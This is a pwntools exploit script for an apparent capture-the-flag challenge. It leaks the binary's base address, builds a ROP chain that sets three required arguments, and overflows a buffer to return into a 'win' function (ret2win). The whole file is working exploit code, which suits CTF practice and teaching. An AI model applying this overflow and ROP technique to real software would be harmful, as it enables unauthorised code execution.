#!/usr/bin/env python3

from pwn import *

TARGET = './chall'
HOST = ''
PORT = 1337

elf = ELF(TARGET)

context.arch = 'amd64'
gdb_script = f"""
  b *main
  c
"""
# context.log_level = 'DEBUG'

if args.GDB:
  context.terminal = ['wt.exe', '-w', '0', 'new-tab', '--', 'bash', '-lc']
  p = gdb.debug(TARGET, gdbscript=gdb_script)
elif not args.REMOTE:
  p = process(TARGET)
else:
  p = remote(HOST, PORT)

# ===================================== #

# Parse leak & Resolve gadgets' address #
p.recvuntil(b'noble ')
elf.address = int(p.recvline()[:-1].strip(), 16) - elf.sym.win
print(f"PIE base: {elf.address:#x}")

pop_rdi = elf.address + 0x11d5
pop_rsi = elf.address + 0x11d7
pop_rdx = elf.address + 0x11d9
ret = pop_rdi + 1
# ========== #

# Ret2win attack with 3 parameters #
# passme1 == 0x12345678abcdef00 && passme2 == 0xcdcdcdcdcdcdcdcd && passme3 == 0xb19b055
bypass_passme = p64(pop_rdi) + p64(0x12345678abcdef00)
bypass_passme += p64(pop_rsi) + p64(0xcdcdcdcdcdcdcdcd)
bypass_passme += p64(pop_rdx) + p64(0xb19b055)

payload = p64(0xdeadbeef) * 4 + p64(0xcafebabe) + p64(ret) + bypass_passme + p64(elf.sym.win)
p.sendlineafter(b'pwnme> ', payload)
# ========== #

p.interactive()

# NOTE:
# Buffer Overflow
# Ret2win
